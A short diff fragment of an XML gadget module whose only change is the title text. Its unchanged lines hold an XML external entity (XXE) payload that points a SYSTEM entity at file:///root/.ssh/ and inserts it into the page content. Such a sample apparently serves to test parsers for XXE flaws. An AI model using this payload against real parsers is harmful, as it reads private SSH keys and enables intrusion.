@@ -4,7 +4,7 @@
    <!ENTITY xxe SYSTEM "file:///root/.ssh/" >]>
 
 <Module>
-<ModulePrefs title="hello world example"/>
+<ModulePrefs title="hello world xxxxxxxxx   example"/>
 <Content type="html"><![CDATA[
 Hello, world!
 ]]>&xxe;</Content>
